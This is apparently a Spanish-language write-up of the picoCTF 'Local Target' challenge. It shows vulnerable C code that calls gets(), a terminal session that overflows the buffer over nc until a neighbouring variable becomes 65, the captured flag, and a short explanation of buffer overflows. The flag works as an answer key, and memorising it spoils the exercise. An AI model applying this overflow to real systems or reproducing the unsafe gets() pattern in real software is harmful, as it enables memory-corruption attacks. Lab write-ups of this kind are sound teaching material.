# Local Target

## Descripción
Rompe la pila.
¿Puedes desbordar el buffer y modificar la otra variable local? El programa está disponible [aquí](https://artifacts.picoctf.net/c/519/local-target). Puedes ver el código fuente [aquí](https://artifacts.picoctf.net/c/519/local-target.c). Y conectar con él usando: `nc saturn.picoctf.net 57055`.

## Pistas
- Haz todo lo que puedas para cambiar `num`
- Cuando cambie `num`, vea el valor como hexadecimal

## Solución
```bash
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ cat local-target.c
#include <stdio.h>
#include <stdlib.h>



int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);

    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }
  
  printf("Bye!\n");
  fflush(stdout);
}
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ python3      
Python 3.10.8 (main, Nov  4 2022, 09:21:25) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> ord('A')
65
>>> ord('a')
97
>>> print('f' * 18)
ffffffffffffffffff
>>> exit()
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071
Enter a string: ffffffffffffffffff

num is 64
Bye!
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071
Enter a string: fffffffffffffffffff

num is 64
Bye!
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071                         
Enter a string: fffffffffffffffffff

num is 64
Bye!
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071
Enter a string: ffffffffffffffffffff

num is 64
Bye!
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071
Enter a string: fffffffffffffffffffff

num is 64
Bye!
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071
Enter a string: ffffffffffffffffffffff

num is 64
Bye!
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071
Enter a string: fffffffffffffffffffffff

num is 64
Bye!
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071
Enter a string: ffffffffffffffffffffffff

num is 0
Bye!
                                                                                                                                              
┌──(kali㉿kali)-[~/picoctf/b_exploitation/LocalTarget]
└─$ nc saturn.picoctf.net 51071
Enter a string: ffffffffffffffffffffffffA

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_ee58441a}
```

>[!solution]
>Para solucionar este reto y obtener la bandera, se busca modificar el valor de la variable `num` declarada justo debajo del arreglo de chars `input` entonces para modificar el valor de la variable que nos interesa con 65 que es el valor de `num` que no permitirá imprimir la bandera se debe hacer un ataque de desbordamiento de búfer y al final de la cadena enviada mandar una A ya que su valor ordinario es 65.

## Bandera
picoCTF{l0c4l5_1n_5c0p3_ee58441a}

## Notas adicionales

>[!danger]
>**Ataque de desbordamiento de búfer**
>Es un error de software que se produce cuando un programa no controla adecuadamente la cantidad de datos que se copian sobre un área de memoria reservada a tal efecto (buffer): Si dicha cantidad es superior a la capacidad preasignada, los bytes sobrantes se almacenan en zonas de memoria adyacentes, sobrescribiendo su contenido original, que probablemente pertenecían a datos o código almacenados en memoria.
>En otras palabras le da al usuario de nuestro programa la forma de sobrescribir una variable a su antojo.

## Referencias
[Desbordamiento de búfer en C](https://parzibyte.me/blog/2018/11/18/desbordamiento-de-bufer-en-c/)